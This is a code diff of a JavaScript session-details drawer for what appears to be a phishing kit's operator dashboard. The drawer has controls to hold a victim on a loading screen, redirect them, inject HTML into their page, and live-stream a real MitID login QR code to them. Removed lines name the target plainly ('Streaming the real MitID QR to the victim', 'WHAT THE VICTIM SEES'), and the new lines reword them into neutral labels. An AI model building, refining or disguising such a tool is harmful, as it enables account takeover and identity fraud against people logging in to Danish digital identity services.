@@ -5,13 +5,28 @@
 const SessionDrawer = (() => {
   let onSessionUpdated = null;
   let onSessionDeleted = null;
+  let _activeCleanup = null;
+  let _drawerEscHandler = null;
+  let _overlayBound = false;
+
+  function _runCleanup() {
+    if (_activeCleanup) {
+      try { _activeCleanup(); } catch (_) {}
+      _activeCleanup = null;
+    }
+    if (_drawerEscHandler) {
+      document.removeEventListener('keydown', _drawerEscHandler);
+      _drawerEscHandler = null;
+    }
+  }
 
   function init(options = {}) {
     onSessionUpdated = options.onSessionUpdated || null;
     onSessionDeleted = options.onSessionDeleted || null;
 
     const overlay = document.getElementById('detail-overlay');
-    if (overlay) {
+    if (overlay && !_overlayBound) {
+      _overlayBound = true;
       overlay.addEventListener('click', (e) => {
         if (e.target === overlay) close();
       });
@@ -23,10 +38,18 @@ const SessionDrawer = (() => {
     const panel = document.getElementById('detail-panel');
     if (!overlay || !panel) return;
 
+    _runCleanup();
     overlay.style.display = 'block';
 
     // Prevent background scrolling
     document.body.style.overflow = 'hidden';
+
+    _drawerEscHandler = (e) => {
+      if (e.key === 'Escape' && !document.querySelector('#live-qr-modal-overlay[style*="flex"]')) {
+        close();
+      }
+    };
+    document.addEventListener('keydown', _drawerEscHandler);
 
     panel.innerHTML = `
       <div class="detail-header">
@@ -68,18 +91,40 @@ const SessionDrawer = (() => {
       const formDataHtml = SessionTemplates.renderFormData(metadata);
       const formCount = (metadata.formData && metadata.formData.length) ? metadata.formData.length : 0;
 
+      const overviewBannersHtml = `
+        ${isHolding
+          ? `<div style="background:rgba(245,158,11,0.08); border:1px solid rgba(245,158,11,0.28); border-radius:10px; padding:12px; margin-bottom:16px; display:flex; gap:10px; align-items:center; font-size:12.5px; color:var(--color-warning);">
+               <span style="font-size:18px; animation: bounceSpin 2.5s infinite; flex-shrink:0;">⏳</span>
+               <div>
+                 <strong style="display:block; color:var(--color-warning);">Visitor is Waiting on Loading Screen</strong>
+                 User is waiting for your redirection response. Click "Redirect Visitor" below to redirect them.
+               </div>
+             </div>`
+          : ''
+        }
+        ${isWarning
+          ? `<div style="background:rgba(239,68,68,0.08); border:1px solid rgba(239,68,68,0.28); border-radius:10px; padding:12px; margin-bottom:16px; display:flex; gap:10px; align-items:center; font-size:12.5px; color:var(--color-danger);">
+               <span style="font-size:18px; flex-shrink:0;">🚨</span>
+               <div>
+                 <strong style="display:block; color:var(--color-danger);">Visitor is on a Warning/Alert Page</strong>
+                 Use the Inject Text panel below to send a custom message to the visitor's page in real-time.
+               </div>
+             </div>`
+          : ''
+        }`;
+
       // Render tabbed panel layout
       panel.innerHTML = `
         <div class="detail-header">
-          <div style="display:flex; flex-direction:column; gap:2px;">
-            <h2 style="font-size:16px; font-weight:700; color:var(--text-primary); margin:0; display:flex; align-items:center; gap:8px;">
+          <div style="display:flex; flex-direction:column; gap:2px; min-width:0;">
+            <h2 style="font-size:16px; font-weight:700; color:var(--text-primary); margin:0; display:flex; align-items:center; gap:8px; flex-wrap:wrap;">
               Session Details
-              ${isHolding 
+              ${isHolding
                 ? `<span class="status-badge holding" style="font-size:8px; padding:1px 6px;">
                      ⏳ Holding
                    </span>`
                 : isWarning
-                ? `<span class="status-badge" style="font-size:8px; padding:1px 6px; background:rgba(239,68,68,0.15); color:#ef4444; border:1px solid rgba(239,68,68,0.3);">
+                ? `<span class="status-badge" style="font-size:8px; padding:1px 6px; background:rgba(239,68,68,0.15); color:var(--color-danger); border:1px solid rgba(239,68,68,0.3);">
                      🚨 Warning
                    </span>`
                 : `<span class="status-badge ${s.is_active ? 'online' : 'offline'}" style="font-size:8px; padding:1px 6px;">
@@ -87,13 +132,13 @@ const SessionDrawer = (() => {
                    </span>`
               }
             </h2>
-            <span style="font-size:10px; font-family:'JetBrains Mono', Consolas, monospace; color:var(--text-muted); letter-spacing:-0.2px;">${SessionTemplates.escapeHtml(s.id)}</span>
-            <div style="display:flex;align-items:center;gap:6px;margin-top:5px;">
+            <span style="font-size:10px; font-family:var(--font-mono); color:var(--text-muted); letter-spacing:-0.2px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;">${SessionTemplates.escapeHtml(s.id)}</span>
+            <div style="display:flex;align-items:center;gap:6px;margin-top:5px;min-width:0;">
               ${SessionTemplates.websiteLogoHtml(s, 18)}
-              <span style="font-size:11px;color:var(--text-secondary);font-weight:600;">${SessionTemplates.escapeHtml(s.website_name || 'Unknown Site')}</span>
+              <span style="font-size:11px;color:var(--text-secondary);font-weight:600;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">${SessionTemplates.escapeHtml(s.website_name || 'Unknown Site')}</span>
             </div>
           </div>
-          <button class="detail-close" id="detail-close">&times;</button>
+          <button class="detail-close" id="detail-close" aria-label="Close drawer">&times;</button>
         </div>
 
         <div class="detail-tabs">
@@ -103,26 +148,7 @@ const SessionDrawer = (() => {
         </div>
 
         <div class="detail-body" id="detail-body-content">
-          ${isHolding 
-            ? `<div style="background:rgba(245,158,11,0.06); border:1px solid rgba(245,158,11,0.22); border-radius:10px; padding:12px; margin-bottom:16px; display:flex; gap:10px; align-items:center; font-size:12.5px; color:#f59e0b;">
-                 <span style="font-size:18px; animation: bounceSpin 2.5s infinite;">⏳</span>
-                 <div>
-                   <strong style="display:block; color:#f59e0b;">Visitor is Waiting on Loading Screen</strong>
-                   User is waiting for your redirection response. Click "Redirect Visitor" below to redirect them.
-                 </div>
-               </div>`
-            : ''
-          }
-          ${isWarning
-            ? `<div style="background:rgba(239,68,68,0.06); border:1px solid rgba(239,68,68,0.22); border-radius:10px; padding:12px; margin-bottom:16px; display:flex; gap:10px; align-items:center; font-size:12.5px; color:#ef4444;">
-                 <span style="font-size:18px;">🚨</span>
-                 <div>
-                   <strong style="display:block; color:#ef4444;">Visitor is on a Warning/Alert Page</strong>
-                   Use the Inject Text panel below to send a custom message to the visitor's page in real-time.
-                 </div>
-               </div>`
-            : ''
-          }
+          ${overviewBannersHtml}
           <!-- Render Info tab content by default -->
           <div class="detail-section">
             <div class="detail-sec-title">Visitor Information</div>
@@ -130,21 +156,21 @@ const SessionDrawer = (() => {
           </div>
         </div>
 
-        <div class="detail-footer" style="display:flex; flex-direction:column; gap:12px;">
+        <div class="detail-footer">
           <!-- Inject Text Panel — visible for active sessions only -->
           ${s.is_active ? `
           <div style="border:1px solid rgba(99,102,241,0.25); border-radius:10px; overflow:hidden;">
             <div id="inject-panel-toggle" style="display:flex; justify-content:space-between; align-items:center; padding:9px 12px; background:rgba(99,102,241,0.07); cursor:pointer; user-select:none;">
-              <span style="font-size:11px; font-weight:700; color:#a5b4fc; letter-spacing:0.3px;">✏️ Inject Text Into Page</span>
+              <span style="font-size:11px; font-weight:700; color:var(--color-info); letter-spacing:0.3px;">✏️ Inject Text Into Page</span>
               <span id="inject-chevron" style="font-size:10px; color:var(--text-tertiary); transition:transform 0.2s;">▼</span>
             </div>
             <div id="inject-panel-body" style="display:none; padding:10px 12px; background:rgba(99,102,241,0.03); border-top:1px solid rgba(99,102,241,0.15);">
-              <textarea id="inject-text-input" placeholder="Type text or HTML to inject into the visitor's page…" style="width:100%; height:70px; resize:vertical; background:rgba(15,15,20,0.6); border:1px solid rgba(99,102,241,0.3); border-radius:7px; padding:8px 10px; color:var(--text-primary); font-size:12px; font-family:Inter,sans-serif; outline:none; line-height:1.5; box-sizing:border-box;"></textarea>
+              <textarea id="inject-text-input" class="sd-textarea" placeholder="Type text or HTML to inject into the visitor's page…"></textarea>
               <div style="display:flex; gap:6px; margin-top:8px;">
-                <button id="inject-send-btn" style="flex:2; padding:7px; background:linear-gradient(135deg,#6366f1,#4f46e5); color:#fff; border:none; border-radius:7px; font-size:11px; font-weight:700; cursor:pointer; font-family:Inter,sans-serif;">💉 Inject</button>
-                <button id="inject-clear-btn" style="flex:1; padding:7px; background:rgba(239,68,68,0.1); border:1px solid rgba(239,68,68,0.22); color:#ef4444; border-radius:7px; font-size:11px; font-weight:600; cursor:pointer;">✖ Clear</button>
+                <button id="inject-send-btn" class="sd-btn-solid sd-btn-solid--indigo">💉 Inject</button>
+                <button id="inject-clear-btn" class="sd-act-danger" style="padding:7px;border-radius:7px;font-size:11px;">✖ Clear</button>
               </div>
-              <p style="margin:6px 0 0; font-size:10px; color:var(--text-muted); line-height:1.4;">The visitor's page must contain <code style="background:rgba(255,255,255,0.07); padding:1px 4px; border-radius:3px;">data-alp-inject</code> element. Supports plain text or HTML.</p>
+              <p style="margin:6px 0 0; font-size:10px; color:var(--text-muted); line-height:1.4;">The visitor's page must contain <code style="padding:1px 4px; border-radius:3px;">data-alp-inject</code> element. Supports plain text or HTML.</p>
             </div>
           </div>
           ` : ''}
@@ -152,7 +178,7 @@ const SessionDrawer = (() => {
           <!-- Set QR Panel — shown only if website has a page with qr-image slot -->
           <div id="set-qr-outer" style="display:none; border:1px solid rgba(16,185,129,0.25); border-radius:10px; overflow:hidden;">
             <div id="set-qr-panel-toggle" style="display:flex; justify-content:space-between; align-items:center; padding:9px 12px; background:rgba(16,185,129,0.07); cursor:pointer; user-select:none;">
-              <span style="font-size:11px; font-weight:700; color:#6ee7b7; letter-spacing:0.3px;">📱 Set QR Code for This Session</span>
+              <span style="font-size:11px; font-weight:700; color:var(--color-success); letter-spacing:0.3px;">📱 Set QR Code for This Session</span>
               <span id="set-qr-chevron" style="font-size:10px; color:var(--text-tertiary); transition:transform 0.2s;">▼</span>
             </div>
             <div id="set-qr-panel-body" style="display:none; padding:10px 12px; background:rgba(16,185,129,0.03); border-top:1px solid rgba(16,185,129,0.15);">
@@ -165,10 +191,10 @@ const SessionDrawer = (() => {
                 <div id="set-qr-file-name" style="font-size:10px; color:var(--text-muted); margin-top:4px;"></div>
               </div>
               <div style="display:flex; gap:6px; margin-top:8px;">
-                <button id="set-qr-save-btn" style="flex:2; padding:7px; background:linear-gradient(135deg,#10b981,#059669); color:#fff; border:none; border-radius:7px; font-size:11px; font-weight:700; cursor:pointer; font-family:Inter,sans-serif; opacity:0.5;" disabled>💾 Save QR for Session</button>
-                <button id="set-qr-clear-btn" style="flex:1; padding:7px; background:rgba(239,68,68,0.1); border:1px solid rgba(239,68,68,0.22); color:#ef4444; border-radius:7px; font-size:11px; font-weight:600; cursor:pointer;">✖ Clear</button>
+                <button id="set-qr-save-btn" class="sd-btn-solid sd-btn-solid--green" style="opacity:0.5;" disabled>💾 Save QR for Session</button>
+                <button id="set-qr-clear-btn" class="sd-act-danger" style="padding:7px;border-radius:7px;font-size:11px;">✖ Clear</button>
               </div>
-              <p style="margin:6px 0 0; font-size:10px; color:var(--text-muted); line-height:1.4;">Sets the <code style="background:rgba(255,255,255,0.07); padding:1px 4px; border-radius:3px;">qr-image</code> slot on the QR page for this visitor only. Takes effect on next page load.</p>
+              <p style="margin:6px 0 0; font-size:10px; color:var(--text-muted); line-height:1.4;">Sets the <code style="padding:1px 4px; border-radius:3px;">qr-image</code> slot on the QR page for this visitor only. Takes effect on next page load.</p>
             </div>
           </div>
 
@@ -241,13 +267,13 @@ const SessionDrawer = (() => {
                 </div>
               </div>
               <div style="display:flex; gap:6px; margin-top:4px;">
-                <button id="live-qr-start-btn" style="flex:2; padding:8px; background:linear-gradient(135deg,#ef4444,#dc2626); color:#fff; border:none; border-radius:7px; font-size:11px; font-weight:700; cursor:pointer; font-family:Inter,sans-serif; display:flex; align-items:center; justify-content:center; gap:4px;">🔴 Start Streaming</button>
-                <button id="live-qr-stop-btn" style="flex:1; padding:8px; background:rgba(107,114,128,0.15); border:1px solid rgba(107,114,128,0.3); color:#9ca3af; border-radius:7px; font-size:11px; font-weight:600; cursor:pointer; display:flex; align-items:center; justify-content:center; gap:4px;" disabled>⏹ Stop</button>
+                <button id="live-qr-start-btn" class="sd-btn-solid sd-btn-solid--red">🔴 Start Streaming</button>
+                <button id="live-qr-stop-btn" style="flex:1; padding:8px; background:var(--bg-tertiary); border:1px solid var(--border-primary); color:var(--text-secondary); border-radius:7px; font-size:11px; font-weight:600; cursor:pointer; display:flex; align-items:center; justify-content:center; gap:4px;" disabled>⏹ Stop</button>
               </div>
-              <div style="display:flex; gap:6px; margin-top:6px;">
+              <div style="display:flex; gap:8px; margin-top:6px; flex-wrap:wrap;">
                 <label style="font-size:10px; color:var(--text-muted); display:flex; align-items:center; gap:4px; cursor:pointer;">
                   <span>Interval:</span>
-                  <select id="live-qr-interval" style="padding:2px 4px; background:rgba(15,15,20,0.6); border:1px solid rgba(239,68,68,0.3); border-radius:4px; color:var(--text-primary); font-size:10px;">
+                  <select id="live-qr-interval" class="sd-select">
                     <option value="300">300ms (fast)</option>
                     <option value="500" selected>500ms</option>
                     <option value="1000">1s</option>
@@ -256,7 +282,7 @@ const SessionDrawer = (() => {
                 </label>
                 <label style="font-size:10px; color:var(--text-muted); display:flex; align-items:center; gap:4px; cursor:pointer;">
                   <span>Quality:</span>
-                  <select id="live-qr-quality" style="padding:2px 4px; background:rgba(15,15,20,0.6); border:1px solid rgba(239,68,68,0.3); border-radius:4px; color:var(--text-primary); font-size:10px;">
+                  <select id="live-qr-quality" class="sd-select">
                     <option value="0.5">Low</option>
                     <option value="0.7" selected>Medium</option>
                     <option value="0.9">High</option>
@@ -294,21 +320,21 @@ const SessionDrawer = (() => {
           </div>
 
           <!-- Action Buttons Row -->
-          <div style="display:flex; gap:8px;">
-            <button id="detail-redirect-modal-trigger" data-sid="${s.id}" style="flex:2; padding:9px; background:linear-gradient(135deg,#D4AF37,#B8962E); color:#0a0a0a; border:none; border-radius:8px; font-size:12px; font-weight:700; cursor:pointer; font-family:Inter,sans-serif; display:flex; align-items:center; justify-content:center; gap:6px;" ${s.is_active ? '' : 'disabled'} title="Redirect Visitor">
+          <div class="sd-actions-row">
+            <button id="detail-redirect-modal-trigger" class="sd-act-redirect" data-sid="${s.id}" ${s.is_active ? '' : 'disabled'} title="Redirect Visitor">
               ↗️ Redirect Visitor
             </button>
 
-            <button id="detail-block-ip" data-ip="${s.ip_address || ''}" style="flex:1; padding:9px; background:rgba(217,119,6,0.12); border:1px solid rgba(217,119,6,0.3); color:#f59e0b; border-radius:8px; font-size:12px; font-weight:600; cursor:pointer; display:flex; align-items:center; justify-content:center; gap:4px;" title="Block Visitor IP">
+            <button id="detail-block-ip" class="sd-act-block" data-ip="${s.ip_address || ''}" title="Block Visitor IP">
               🚫 Block IP
             </button>
-            
+
             ${s.is_active ? `
-              <button id="detail-end-session" data-sid="${s.id}" style="flex:1; padding:9px; background:rgba(239,68,68,0.1); border:1px solid rgba(239,68,68,0.22); color:#ef4444; border-radius:8px; font-size:12px; font-weight:600; cursor:pointer; display:flex; align-items:center; justify-content:center; gap:4px;" title="Force End Session">
+              <button id="detail-end-session" class="sd-act-danger" data-sid="${s.id}" title="Force End Session">
                 ⛔ End Session
               </button>
             ` : `
-              <button id="detail-delete-session" data-sid="${s.id}" style="flex:1; padding:9px; background:rgba(239,68,68,0.1); border:1px solid rgba(239,68,68,0.22); color:#ef4444; border-radius:8px; font-size:12px; font-weight:600; cursor:pointer; display:flex; align-items:center; justify-content:center; gap:4px;" title="Permanently Delete Session">
+              <button id="detail-delete-session" class="sd-act-danger" data-sid="${s.id}" title="Permanently Delete Session">
                 🗑️ Delete
               </button>
             `}
@@ -383,6 +409,7 @@ const SessionDrawer = (() => {
 
           if (tab === 'info') {
             bodyContent.innerHTML = `
+              ${overviewBannersHtml}
               <div class="detail-section">
                 <div class="detail-sec-title">Visitor Information</div>
                 <div class="detail-grid">${infoGridHtml}</div>
@@ -679,98 +706,86 @@ const SessionDrawer = (() => {
       // ═══════════════════════════════════════════════════════════════════
       let _modalEl = null;
       let _modalElements = null;  // refs to modal's own preview/stat/banner elements
+      let _modalEscHandler = null;
+      let _liveQrPoll = null;
 
       function _buildModal() {
         if (_modalEl) return;
         const overlay = document.createElement('div');
         overlay.id = 'live-qr-modal-overlay';
-        overlay.style.cssText = 'position:fixed; inset:0; background:rgba(0,0,0,0.85); backdrop-filter:blur(10px); -webkit-backdrop-filter:blur(10px); z-index:9999; display:none; align-items:center; justify-content:center; padding:24px; animation:fadeIn 0.2s ease;';
+        overlay.className = 'lqr-overlay';
 
         overlay.innerHTML = `
-          <style>
-            @keyframes fadeIn { from { opacity:0; } to { opacity:1; } }
-            @keyframes modalSlide { from { transform:translateY(20px); opacity:0; } to { transform:translateY(0); opacity:1; } }
-          </style>
-          <div style="width:100%; max-width:980px; max-height:92vh; overflow-y:auto; background:linear-gradient(145deg, #0a0a0f 0%, #15151e 100%); border:1px solid rgba(239,68,68,0.3); border-radius:16px; box-shadow:0 25px 70px rgba(0,0,0,0.7), 0 0 100px rgba(239,68,68,0.15); animation:modalSlide 0.3s ease;">
-            <!-- Header -->
-            <div style="display:flex; justify-content:space-between; align-items:center; padding:14px 20px; border-bottom:1px solid rgba(239,68,68,0.2); background:linear-gradient(90deg, rgba(239,68,68,0.1), transparent);">
+          <div class="lqr-modal">
+            <div class="lqr-hdr">
               <div>
-                <div style="font-size:15px; font-weight:800; color:#f87171; letter-spacing:0.5px; display:flex; align-items:center; gap:10px;">
-                  <span style="display:inline-block; width:10px; height:10px; border-radius:50%; background:#ef4444; box-shadow:0 0 12px #ef4444; animation:pulseGlow 1.2s infinite;"></span>
+                <div class="lqr-title">
+                  <span style="display:inline-block; width:10px; height:10px; border-radius:50%; background:#ef4444; box-shadow:0 0 12px #ef4444; animation:pulseGlow 1.2s infinite; flex-shrink:0;"></span>
                   LIVE QR STREAM — FULLSCREEN
                 </div>
-                <div style="font-size:11px; color:var(--text-muted); margin-top:4px;">Streaming the real MitID QR to the victim in real-time</div>
+                <div style="font-size:11px; color:var(--text-muted); margin-top:4px;">Real-time QR preview stream</div>
               </div>
-              <button id="live-qr-modal-close" style="background:rgba(107,114,128,0.2); border:1px solid rgba(107,114,128,0.4); color:#9ca3af; padding:8px 14px; border-radius:8px; font-size:12px; font-weight:700; cursor:pointer; display:flex; align-items:center; gap:6px;">✕ Close</button>
+              <button id="live-qr-modal-close" class="lqr-close">✕ Close</button>
             </div>
 
-            <!-- Big status banner -->
-            <div id="modal-detect-status" style="display:none; margin:12px 20px 0; padding:12px 20px; border-radius:12px; font-size:16px; font-weight:900; letter-spacing:0.8px; text-align:center; text-transform:uppercase; position:relative; overflow:hidden; transition:all 0.3s ease;">
+            <div id="modal-detect-status" style="display:none; margin:12px 20px 0; padding:12px 20px; border-radius:12px; font-size:15px; font-weight:900; letter-spacing:0.6px; text-align:center; text-transform:uppercase; position:relative; overflow:hidden; transition:all 0.3s ease;">
               <span id="modal-detect-status-text" style="position:relative; z-index:2;"></span>
               <span style="position:absolute; top:0; left:-100%; width:50%; height:100%; background:linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent); animation:shineSweep 2.4s infinite; z-index:1;"></span>
             </div>
 
-            <!-- Dual preview — BIG -->
-            <div style="display:grid; grid-template-columns:1fr 1fr; gap:14px; padding:14px 20px;">
-              <!-- Source (big) -->
-              <div style="position:relative; border:1px solid rgba(239,68,68,0.3); border-radius:12px; overflow:hidden; background:rgba(0,0,0,0.4); min-height:280px;">
-                <div style="position:absolute; top:8px; left:10px; font-size:10px; font-weight:800; color:#fbbf24; letter-spacing:1px; text-transform:uppercase; z-index:2; background:rgba(0,0,0,0.75); padding:4px 10px; border-radius:6px;">📺 SOURCE — WHAT YOU SHARE</div>
-                <canvas id="modal-full-preview" style="width:100%; height:280px; display:block; background:#000;"></canvas>
+            <div class="lqr-dual">
+              <div class="lqr-pane lqr-pane--source">
+                <div class="lqr-pane-tag">📺 SOURCE</div>
+                <canvas id="modal-full-preview" style="width:100%; height:260px; display:block; background:#000;"></canvas>
               </div>
-              <!-- Sent (big) -->
-              <div style="position:relative; border:1px solid rgba(16,185,129,0.4); border-radius:12px; overflow:hidden; background:#fff; min-height:280px;">
-                <div style="position:absolute; top:8px; left:10px; font-size:10px; font-weight:800; color:#059669; letter-spacing:1px; text-transform:uppercase; z-index:2; background:rgba(255,255,255,0.9); padding:4px 10px; border-radius:6px;">📤 SENT — WHAT THE VICTIM SEES</div>
-                <img id="modal-preview" src="" alt="Cropped QR" style="width:100%; height:280px; object-fit:contain; display:block; background:#fff; image-rendering:pixelated; image-rendering:-moz-crisp-edges; image-rendering:crisp-edges;">
+              <div class="lqr-pane lqr-pane--sent">
+                <div class="lqr-pane-tag">📤 SENT PREVIEW</div>
+                <img id="modal-preview" src="" alt="Cropped QR" style="width:100%; height:260px; object-fit:contain; display:block; background:#fff; image-rendering:pixelated; image-rendering:crisp-edges;">
               </div>
             </div>
 
-            <!-- Big stats grid -->
-            <div style="display:grid; grid-template-columns:repeat(6,1fr); gap:8px; padding:0 20px 14px; font-family:'JetBrains Mono', monospace;">
-              <div style="background:linear-gradient(135deg, rgba(239,68,68,0.1), rgba(239,68,68,0.03)); border:1px solid rgba(239,68,68,0.3); border-radius:9px; padding:10px 12px;">
-                <div style="font-size:9px; color:var(--text-muted); letter-spacing:0.8px; text-transform:uppercase; margin-bottom:6px;">FPS</div>
-                <div id="modal-stat-fps" style="font-size:22px; color:#f87171; font-weight:800;">—</div>
+            <div class="lqr-stats">
+              <div class="lqr-stat">
+                <div class="lqr-stat-lbl">FPS</div>
+                <div id="modal-stat-fps" class="lqr-stat-val" style="color:var(--color-danger);">—</div>
               </div>
-              <div style="background:linear-gradient(135deg, rgba(251,191,36,0.1), rgba(251,191,36,0.03)); border:1px solid rgba(251,191,36,0.3); border-radius:10px; padding:14px;">
-                <div style="font-size:10px; color:var(--text-muted); letter-spacing:1px; text-transform:uppercase; margin-bottom:6px;">Frames</div>
-                <div id="modal-stat-frames" style="font-size:22px; color:#fbbf24; font-weight:800;">0</div>
+              <div class="lqr-stat">
+                <div class="lqr-stat-lbl">Frames</div>
+                <div id="modal-stat-frames" class="lqr-stat-val" style="color:var(--color-warning);">0</div>
               </div>
-              <div style="background:linear-gradient(135deg, rgba(96,165,250,0.1), rgba(96,165,250,0.03)); border:1px solid rgba(96,165,250,0.3); border-radius:10px; padding:14px;">
-                <div style="font-size:10px; color:var(--text-muted); letter-spacing:1px; text-transform:uppercase; margin-bottom:6px;">Size</div>
-                <div id="modal-stat-size" style="font-size:22px; color:#60a5fa; font-weight:800;">—</div>
+              <div class="lqr-stat">
+                <div class="lqr-stat-lbl">Size</div>
+                <div id="modal-stat-size" class="lqr-stat-val" style="color:var(--color-info);">—</div>
               </div>
-              <div style="background:linear-gradient(135deg, rgba(16,185,129,0.1), rgba(16,185,129,0.03)); border:1px solid rgba(16,185,129,0.3); border-radius:10px; padding:14px;">
-                <div style="font-size:10px; color:var(--text-muted); letter-spacing:1px; text-transform:uppercase; margin-bottom:6px;">Detector</div>
-                <div id="modal-stat-detector" style="font-size:16px; color:#6ee7b7; font-weight:800;">—</div>
+              <div class="lqr-stat">
+                <div class="lqr-stat-lbl">Detector</div>
+                <div id="modal-stat-detector" class="lqr-stat-val" style="font-size:14px; color:var(--color-success);">—</div>
               </div>
-              <div style="background:linear-gradient(135deg, rgba(167,139,250,0.1), rgba(167,139,250,0.03)); border:1px solid rgba(167,139,250,0.3); border-radius:10px; padding:14px;">
-                <div style="font-size:10px; color:var(--text-muted); letter-spacing:1px; text-transform:uppercase; margin-bottom:6px;">Uptime</div>
-                <div id="modal-stat-uptime" style="font-size:22px; color:#a78bfa; font-weight:800;">00:00</div>
+              <div class="lqr-stat">
+                <div class="lqr-stat-lbl">Uptime</div>
+                <div id="modal-stat-uptime" class="lqr-stat-val" style="color:#8b5cf6;">00:00</div>
               </div>
-              <div style="background:linear-gradient(135deg, rgba(110,231,183,0.1), rgba(110,231,183,0.03)); border:1px solid rgba(110,231,183,0.3); border-radius:10px; padding:14px;">
-                <div style="font-size:10px; color:var(--text-muted); letter-spacing:1px; text-transform:uppercase; margin-bottom:6px;">QR Box</div>
-                <div id="modal-stat-qrbox" style="font-size:16px; color:#6ee7b7; font-weight:800;">—</div>
+              <div class="lqr-stat">
+                <div class="lqr-stat-lbl">QR Box</div>
+                <div id="modal-stat-qrbox" class="lqr-stat-val" style="font-size:14px; color:var(--color-success);">—</div>
               </div>
             </div>
 
-            <!-- Controls section -->
-            <div style="padding:0 24px 20px;">
-              <!-- Streaming status indicator -->
-              <div style="display:flex; align-items:center; gap:10px; padding:10px 14px; background:rgba(0,0,0,0.3); border:1px solid rgba(239,68,68,0.2); border-radius:10px; margin-bottom:14px;">
-                <span id="modal-live-dot" style="width:10px; height:10px; border-radius:50%; background:#6b7280; display:inline-block; transition:all 0.3s;"></span>
+            <div class="lqr-controls">
+              <div class="lqr-status-bar">
+                <span id="modal-live-dot" style="width:10px; height:10px; border-radius:50%; background:#6b7280; display:inline-block; transition:all 0.3s; flex-shrink:0;"></span>
                 <span id="modal-live-status-text" style="font-size:13px; font-weight:600; color:var(--text-secondary);">Not streaming</span>
               </div>
 
-              <!-- Big Start/Stop buttons -->
-              <div style="display:flex; gap:10px; margin-bottom:12px;">
-                <button id="modal-live-start-btn" style="flex:2; padding:14px; background:linear-gradient(135deg,#ef4444,#dc2626); color:#fff; border:none; border-radius:10px; font-size:14px; font-weight:800; cursor:pointer; font-family:Inter,sans-serif; display:flex; align-items:center; justify-content:center; gap:8px; letter-spacing:0.5px; box-shadow:0 4px 12px rgba(239,68,68,0.3); transition:all 0.2s;">🔴 START STREAMING</button>
-                <button id="modal-live-stop-btn" style="flex:1; padding:14px; background:rgba(107,114,128,0.15); border:1px solid rgba(107,114,128,0.3); color:#9ca3af; border-radius:10px; font-size:14px; font-weight:700; cursor:pointer; display:flex; align-items:center; justify-content:center; gap:6px; letter-spacing:0.3px;" disabled>⏹ STOP</button>
+              <div class="lqr-btn-row">
+                <button id="modal-live-start-btn" class="sd-btn-solid sd-btn-solid--red" style="padding:12px; font-size:13.5px; letter-spacing:0.4px; border-radius:10px;">🔴 START STREAMING</button>
+                <button id="modal-live-stop-btn" style="flex:1; padding:12px; background:var(--bg-tertiary); border:1px solid var(--border-primary); color:var(--text-secondary); border-radius:10px; font-size:13.5px; font-weight:700; cursor:pointer; display:flex; align-items:center; justify-content:center; gap:6px;" disabled>⏹ STOP</button>
               </div>
 
-              <!-- Settings row -->
-              <div style="display:flex; gap:16px; align-items:center; padding:12px 14px; background:rgba(0,0,0,0.2); border:1px solid rgba(255,255,255,0.05); border-radius:10px; flex-wrap:wrap;">
+              <div class="lqr-settings-row">
                 <label style="font-size:12px; color:var(--text-secondary); display:flex; align-items:center; gap:6px; cursor:pointer;">
                   <span style="font-weight:600;">Interval:</span>
-                  <select id="modal-live-interval" style="padding:5px 8px; background:rgba(15,15,20,0.8); border:1px solid rgba(239,68,68,0.3); border-radius:6px; color:var(--text-primary); font-size:12px; cursor:pointer;">
+                  <select id="modal-live-interval" class="sd-select">
                     <option value="300">300ms (fast)</option>
                     <option value="500" selected>500ms</option>
                     <option value="1000">1s</option>
@@ -779,24 +794,24 @@ const SessionDrawer = (() => {
                 </label>
                 <label style="font-size:12px; color:var(--text-secondary); display:flex; align-items:center; gap:6px; cursor:pointer;">
                   <span style="font-weight:600;">Quality:</span>
-                  <select id="modal-live-quality" style="padding:5px 8px; background:rgba(15,15,20,0.8); border:1px solid rgba(239,68,68,0.3); border-radius:6px; color:var(--text-primary); font-size:12px; cursor:pointer;">
+                  <select id="modal-live-quality" class="sd-select">
                     <option value="0.5">Low</option>
                     <option value="0.7" selected>Medium</option>
                     <option value="0.9">High</option>
                   </select>
                 </label>
-                <label style="font-size:12px; color:var(--text-secondary); display:flex; align-items:center; gap:8px; cursor:pointer; margin-left:auto;">
+                <label style="font-size:12px; color:var(--text-secondary); display:flex; align-items:center; gap:8px; cursor:pointer;">
                   <input type="checkbox" id="modal-live-smart" checked style="margin:0; cursor:pointer; width:16px; height:16px;">
-                  <span style="font-weight:600;">🎯 Smart Crop (auto-detect QR)</span>
+                  <span style="font-weight:600;">🎯 Smart Crop</span>
                 </label>
-                <label style="font-size:12px; color:var(--text-secondary); display:flex; align-items:center; gap:8px; cursor:pointer;" title="When detection fails, keep showing the last captured QR on the victim's page">
+                <label style="font-size:12px; color:var(--text-secondary); display:flex; align-items:center; gap:8px; cursor:pointer;">
                   <input type="checkbox" id="modal-live-hold" checked style="margin:0; cursor:pointer; width:16px; height:16px;">
                   <span style="font-weight:600;">🔒 Hold on miss</span>
                 </label>
               </div>
 
-              <div style="margin-top:14px; padding-top:14px; border-top:1px solid rgba(255,255,255,0.05); font-size:11px; color:var(--text-muted); text-align:center;">
-                Press <kbd style="background:rgba(255,255,255,0.1); padding:2px 6px; border-radius:4px; font-family:monospace;">ESC</kbd> or click outside to close. Streaming continues in the background.
+              <div style="margin-top:12px; padding-top:12px; border-top:1px solid var(--border-subtle); font-size:11px; color:var(--text-muted); text-align:center;">
+                Press <kbd style="background:var(--bg-tertiary); border:1px solid var(--border-primary); padding:2px 6px; border-radius:4px; font-family:var(--font-mono);">ESC</kbd> or click outside to close.
               </div>
             </div>
           </div>
@@ -885,9 +900,10 @@ const SessionDrawer = (() => {
         // Close handlers
         overlay.querySelector('#live-qr-modal-close').addEventListener('click', _closeModal);
         overlay.addEventListener('click', (e) => { if (e.target === overlay) _closeModal(); });
-        document.addEventListener('keydown', (e) => {
+        _modalEscHandler = (e) => {
           if (e.key === 'Escape' && _modalEl && _modalEl.style.display === 'flex') _closeModal();
-        });
+        };
+        document.addEventListener('keydown', _modalEscHandler);
       }
 
       function _openModal() {
@@ -935,13 +951,14 @@ const SessionDrawer = (() => {
       // We piggyback on the same async block — wrap it:
       if (liveQrOuter && s.website_id && !_qrTargetPage) {
         // The async block above already sets _qrTargetPage — we poll for it briefly
-        const _liveQrPoll = setInterval(() => {
+        _liveQrPoll = setInterval(() => {
           if (_qrTargetPage) {
             liveQrOuter.style.display = 'block';
